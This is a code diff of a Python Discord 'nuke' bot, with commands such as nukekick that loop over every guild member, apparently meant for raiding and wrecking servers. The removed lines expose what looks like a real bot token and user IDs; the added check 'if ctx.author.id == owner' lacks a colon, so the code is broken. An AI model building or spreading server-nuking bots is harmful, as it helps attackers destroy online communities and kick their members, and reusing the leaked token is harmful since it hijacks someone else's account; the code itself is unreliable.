@@ -14,7 +14,7 @@ from PIL import Image
 from io import BytesIO
 from discord.flags import Intents
 import os
-owner = 682376656328982539
+owner = (your discord id)
 # prefix
 bot = commands.Bot(command_prefix='!!')
 #bot version
@@ -25,11 +25,11 @@ bot.remove_command('help')
 
 @bot.event 
 async def on_ready(ctx):
-    print("Bot Online! <:theman:880247113336913970>")
+    print("Bot Online!")
 
 @bot.event 
 async def on_ready():
-    await bot.change_presence(status=discord.Status.online, activity=discord.Game('Discord.exe/appdata'))
+    await bot.change_presence(status=discord.Status.online, activity=discord.Game('Nuke simulator'))
     print('Bot Online')
     print('███╗░░██╗██╗░░░██╗██╗░░██╗███████╗')
     print('████╗░██║██║░░░██║██║░██╔╝██╔════╝')
@@ -72,7 +72,7 @@ async def nukechan(ctx):
 async def nukekick(ctx):
   await ctx.message.delete()
 
-  if ctx.author.id == owner or ctx.author.id == 554785423948251166:
+  if ctx.author.id == owner
 
 
     for member in ctx.guild.members:
@@ -172,4 +172,4 @@ async def credit(ctx):
 
 
 
-bot.run('ODgwMjQyMDg0Mjk5Mjg0NTYx.YSbbUw.dofE_2BxXujw9N8UNX3jE1Px5YQ')
+bot.run('yourtoken')
